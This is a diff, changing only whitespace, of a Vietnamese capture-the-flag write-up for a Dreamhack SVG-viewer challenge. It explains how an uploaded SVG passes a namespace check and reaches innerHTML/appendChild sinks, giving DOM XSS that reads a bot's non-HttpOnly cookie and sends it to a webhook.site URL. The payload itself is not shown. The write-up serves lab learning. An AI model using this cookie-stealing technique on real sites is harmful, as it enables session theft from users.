@@ -1,13 +1,13 @@
-# Đề bài 
+# Đề bài
 This is a service that shows SVG files separately.
 
 Find vulnerabilities in services and exploit them to earn flags!
 
 The flag format is DH {...} This is it.
 https://dreamhack.io/wargame/challenges/1937
-# Solution 
+# Solution
 ## 1. Flag nằm ở đâu — đọc `app.py`
-Inspect code, ta thấy flag được giữ tại cookie của bot 
+Inspect code, ta thấy flag được giữ tại cookie của bot
 ```python
 try:
     FLAG = open("./flag", "r").read()
@@ -27,7 +27,7 @@ def read_file(filename):
     WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, "svg")))
 ```
 1. Flag nằm trong cookie tên `flag`, và cookie này không có cờ `HttpOnly`. Cờ `HttpOnly` nếu bật thì JavaScript không đọc được cookie bằng `document.cookie`. Ở đây không bật nên đọc được `document.cookie` để lấy flag.
-2. Upload xong là bot chạy liền (`read_file` gọi ngay trong `/upload`). 
+2. Upload xong là bot chạy liền (`read_file` gọi ngay trong `/upload`).
 3. Bot mở `http://127.0.0.1:8000/?file=uploads/<file-của-mình>`. JS của mình sẽ chạy trong cùng origin `127.0.0.1:8000` với cookie nên đọc được cookie thoải mái.
 
 => Vậy để lấy được flag, ta phải để cookie chảy về website mà ta kiểm soát (ở đây tôi sử dụng [webhook](https://webhook.site/#!/view/7d8586dc-1810-4e8d-bea6-a865704b1ff0) để đọc được cookie)
@@ -125,7 +125,7 @@ def load_new_svg(svg_content):
     svg_element = load_svg_from_string(svg_content)    # parse lại lần nữa
     svg_container.innerHTML = ""
     svg_container.appendChild(svg_element)             # (SINK #2) gắn NODE đã parse vào trang
-    
+
     initialize_svg_mover(svg_content)                  # (bên trong lại appendChild lần nữa)
 ```
 Hai dòng `innerHTML` và `appendChild` chính là nơi SVG được đưa vào trang hiển thị, là 2 sink để kích hoạt DOM XSS.
@@ -149,7 +149,7 @@ Theo như đã nói đến ở [trên](#SVG-inline-trong-HTML-→-KHÔNG-cần-n
 ```python
 if doc.documentElement.tagName != "svg" or doc.documentElement.namespaceURI not in ["http://www.w3.org/2000/svg", "x"]:
 ```
-Nên trong payload ta phải để `xmlns="http://www.w3.org/2000/svg"` hoặc `xmlns="x"` với mục đích chỉ là để qua bước validate. 
+Nên trong payload ta phải để `xmlns="http://www.w3.org/2000/svg"` hoặc `xmlns="x"` với mục đích chỉ là để qua bước validate.
 
 ## 5. Payload
 Tạo file `exploit.svg`:
